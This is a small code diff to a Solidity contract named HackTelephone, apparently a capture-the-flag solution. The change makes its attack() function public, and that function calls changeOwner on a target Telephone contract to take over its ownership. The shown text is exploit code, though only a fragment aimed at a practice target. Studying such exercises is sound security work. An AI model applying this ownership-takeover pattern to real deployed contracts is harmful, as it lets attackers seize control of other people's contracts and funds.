@@ -15,7 +15,7 @@ contract HackTelephone {
     owner = payable(msg.sender);
   }
 
-  function attack() {
+  function attack() public {
     telephone.changeOwner(owner);
   }
 
